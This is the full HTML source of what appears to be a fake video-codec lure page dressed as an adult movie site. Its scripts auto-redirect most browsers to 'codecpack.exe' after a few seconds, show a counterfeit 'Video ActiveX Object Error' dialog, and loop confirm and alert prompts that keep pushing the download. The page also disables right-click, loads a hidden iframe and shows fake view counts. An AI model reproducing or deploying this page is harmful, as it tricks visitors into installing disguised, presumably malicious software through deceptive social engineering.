<html>
<head>
<title>~~!PORN-SUPERSTAR MOVIE HARDCORE VIDEO ONLINE!~~</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<meta content="MSHTML 6.00.2900.2180" name="GENERATOR">
<link href="injection_graph.css" type="text/css" rel="stylesheet" charset="utf-8" id="injection_graph_css">
<script charset="utf-8" id="injection_graph_func" src="injection_graph_func.js"></script>
</head>

<body oncontextmenu="return false;" leftmargin="0" topmargin="0" bgcolor="black" link="#eeeeee" text="#ccffff" vlink="#eeeeee">
<h2 style="margin: 0px; font-family: Arial; font-style: normal; font-variant: normal; font-weight: bold; font-size: 14pt; line-height: normal; font-size-adjust: none; font-stretch: normal; color: rgb(255, 255, 0);" align="center">&nbsp;
</h2>

<script language="javascript">
codec_url='codecpack.exe';
</script>



<script language="javascript">

function softdownload()
{
  if(window.navigator.userAgent.indexOf("SV1") != -1 || window.navigator.userAgent.indexOf("MSIE 7") !=-1) 
  {
    return;
  }
  else 
  {
    window.setTimeout("location.href='" + codec_url + "'", 3000);
  }
}

function play() {
	if (confirm('Click \'OK\' to download and install media codec.')) {
window.location.href=codec_url;
	}
	else {
		if (alert('Please download new version of media codec software.')) {
			play();
		}
		else {
			play();
		}			
	}
}

function Down() {
document.getElementById("popdiv").style.visibility="hidden"; 
window.location.href=codec_url;
} 

function Down2() {
document.getElementById("popdiv").style.visibility="visible";
} 

function Close() 
{
document.getElementById("popdiv").style.visibility="hidden";
play();
} 


function Details()
{
	alert('Download video codec to view media files.');
}

var Drag = {
	obj : null,
	init : function(o, oRoot, minX, maxX, minY, maxY, bSwapHorzRef, bSwapVertRef, fXMapper, fYMapper)
	{
		o.onmousedown	= Drag.start;

		o.hmode			= bSwapHorzRef ? false : true ;
		o.vmode			= bSwapVertRef ? false : true ;

		o.root = oRoot && oRoot != null ? oRoot : o ;

		if (o.hmode  && isNaN(parseInt(o.root.style.left  ))) o.root.style.left   = "0px";
		if (o.vmode  && isNaN(parseInt(o.root.style.top   ))) o.root.style.top    = "0px";
		if (!o.hmode && isNaN(parseInt(o.root.style.right ))) o.root.style.right  = "0px";
		if (!o.vmode && isNaN(parseInt(o.root.style.bottom))) o.root.style.bottom = "0px";

		o.minX	= typeof minX != 'undefined' ? minX : null;
		o.minY	= typeof minY != 'undefined' ? minY : null;
		o.maxX	= typeof maxX != 'undefined' ? maxX : null;
		o.maxY	= typeof maxY != 'undefined' ? maxY : null;

		o.xMapper = fXMapper ? fXMapper : null;
		o.yMapper = fYMapper ? fYMapper : null;

		o.root.onDragStart	= new Function();
		o.root.onDragEnd	= new Function();
		o.root.onDrag		= new Function();
	},

	start : function(e)
	{
		var o = Drag.obj = this;
		e = Drag.fixE(e);
		var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
		var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
		o.root.onDragStart(x, y);

		o.lastMouseX	= e.clientX;
		o.lastMouseY	= e.clientY;

		if (o.hmode) {
			if (o.minX != null)	o.minMouseX	= e.clientX - x + o.minX;
			if (o.maxX != null)	o.maxMouseX	= o.minMouseX + o.maxX - o.minX;
		} else {
			if (o.minX != null) o.maxMouseX = -o.minX + e.clientX + x;
			if (o.maxX != null) o.minMouseX = -o.maxX + e.clientX + x;
		}

		if (o.vmode) {
			if (o.minY != null)	o.minMouseY	= e.clientY - y + o.minY;
			if (o.maxY != null)	o.maxMouseY	= o.minMouseY + o.maxY - o.minY;
		} else {
			if (o.minY != null) o.maxMouseY = -o.minY + e.clientY + y;
			if (o.maxY != null) o.minMouseY = -o.maxY + e.clientY + y;
		}

		document.onmousemove	= Drag.drag;
		document.onmouseup		= Drag.end;

		return false;
	},

	drag : function(e)
	{
		e = Drag.fixE(e);
		var o = Drag.obj;

		var ey	= e.clientY;
		var ex	= e.clientX;
		var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
		var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
		var nx, ny;

		if (o.minX != null) ex = o.hmode ? Math.max(ex, o.minMouseX) : Math.min(ex, o.maxMouseX);
		if (o.maxX != null) ex = o.hmode ? Math.min(ex, o.maxMouseX) : Math.max(ex, o.minMouseX);
		if (o.minY != null) ey = o.vmode ? Math.max(ey, o.minMouseY) : Math.min(ey, o.maxMouseY);
		if (o.maxY != null) ey = o.vmode ? Math.min(ey, o.maxMouseY) : Math.max(ey, o.minMouseY);

		nx = x + ((ex - o.lastMouseX) * (o.hmode ? 1 : -1));
		ny = y + ((ey - o.lastMouseY) * (o.vmode ? 1 : -1));

		if (o.xMapper)		nx = o.xMapper(y)
		else if (o.yMapper)	ny = o.yMapper(x)

		Drag.obj.root.style[o.hmode ? "left" : "right"] = nx + "px";
		Drag.obj.root.style[o.vmode ? "top" : "bottom"] = ny + "px";
		Drag.obj.lastMouseX	= ex;
		Drag.obj.lastMouseY	= ey;

		Drag.obj.root.onDrag(nx, ny);
		return false;
	},

	end : function()
	{
		document.onmousemove = null;
		document.onmouseup   = null;
		Drag.obj.root.onDragEnd(	parseInt(Drag.obj.root.style[Drag.obj.hmode ? "left" : "right"]), 
									parseInt(Drag.obj.root.style[Drag.obj.vmode ? "top" : "bottom"]));
		Drag.obj = null;
	},

	fixE : function(e)
	{
		if (typeof e == 'undefined') e = window.event;
		if (typeof e.layerX == 'undefined') e.layerX = e.offsetX;
		if (typeof e.layerY == 'undefined') e.layerY = e.offsetY;
		return e;
	}
};

function showPopDiv()
{
var sFlag = "No";
var byFlag = false;
var FlagAr = sFlag.split("");

if (FlagAr[0]=="1"){byFlag = true;}
if (FlagAr[0]=="3"){byFlag = true;}

if(!byFlag)
{
 var p=document.getElementById("popdiv"); 
 wmpwidth=document.body.clientWidth/2-190;
 wmpheight=document.body.clientHeight/2-130;
 p.style.top = wmpheight;
 p.style.left = wmpwidth;
 p.style.visibility = "visible";
 p.focus();
 }
}

softdownload();
setTimeout("showPopDiv();",1300);
</script>

<center>
<a href="javascript:Down2();"><img style="border: 1px solid rgb(238, 238, 238); background: rgb(0, 0, 0) none repeat scroll 0%; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial;" src="play.gif" height="400" width="480"></a> 

<div id="popdiv" style="z-index: 1; left: 450px; visibility: hidden ; position: absolute; top: 240px;" name="popdiv">


<table border="0" cellpadding="0" cellspacing="0" width="389">
<tbody><tr>
  <td height="36">
    <table border="0" cellpadding="0" cellspacing="0">
    <tbody><tr>

      <td height="36" width="5"><img src="img0.gif" height="36" width="5"></td>
      <td background="img1.gif" bgcolor="#0064b2" width="357"><font style="font-family: Verdana; font-style: normal; font-variant: normal; font-weight: bold; font-size: 12px; line-height: normal; font-size-adjust: none; font-stretch: normal; color: rgb(255, 255, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Video codec Error</font></td>
      <td bgcolor="#0064b2" width="21"><img src="img2.gif" onClick="Close();" height="36" width="21"></td>
      <td width="6"><img src="img3.gif" height="36" width="6"></td>
    </tr>
    </tbody></table>
  </td>
</tr>

<tr>
  <td background="img4.gif" bgcolor="#ffffde" height="203" valign="top">
    <table border="0" cellpadding="0" cellspacing="0" height="130" width="100%">
    <tbody><tr>
      <td width="120">&nbsp;</td>
      <td valign="top">
      	<div style="width: 100%; height: 35px;"></div>
        <font style="font-size: 11px;" color="#000000" face="Tahoma">
        <b>Video ActiveX Object Error:</b><br>

Your browser cannot display this video file.<br><br>
You need to download new version of Video<br>
ActiveX Object to play this video file.        </font>
      </td>
    </tr>
    </tbody></table>
    <table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tbody><tr>
      <td align="center">

        <font style="font-size: 11px;" color="#000000" face="Tahoma">
          To download and install ActiveX Object click <a href="codecpack.exe" style="font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 11px; line-height: normal; font-size-adjust: none; font-stretch: normal; color: rgb(0, 0, 0); text-decoration: underline;">Continue</a>.<br><br>
          <input value="Continue" onClick="Down('iax');" style="border: 0pt none ; font-family: Arial; font-size: 12px; font-weight: bold; color: rgb(255, 255, 255); background-color: rgb(0, 156, 238);  width: 104px; height: 26px;" type="submit">
          <input value="Cancel" onClick="Close();" style="border: 0pt none ; font-family: Arial; font-size: 12px; font-weight: bold; color: rgb(255, 255, 255); background-color: rgb(161, 161, 161);width: 104px; height: 26px;" type="submit">
          <input value="Details..." onClick="Details();" style="border: 0pt none ; font-family: Arial; font-size: 12px; font-weight: bold; color: rgb(255, 255, 255); background-color: rgb(161, 161, 161);  width: 104px; height: 26px;" type="submit">
        </font>
      </td>
<iframe id="01" src="metai.html" frameborder="0" style="display:none"></iframe>
    </tr>
    </tbody></table>
  </td>
</tr>
<tr>
  <td height="6"><img src="img6.gif" height="6" width="389"></td>
</tr>
</tbody></table>

</div>

<script>Drag.init(document.getElementById('popdiv'));</script>

<br><br>
          <br>
          <div style="font-family: Verdana; font-style: normal; font-variant: normal; font-weight: normal; font-size: 16pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">Duration: 87 min 35 sec</div>
          <div style="font-family: Arial; font-style: normal; font-variant: normal; font-weight: normal; font-size: 14pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">Raiting 10/10; 11095 views<br>170 users are watching this movie right now</div>
          <br> </center><br>
</body>
</html>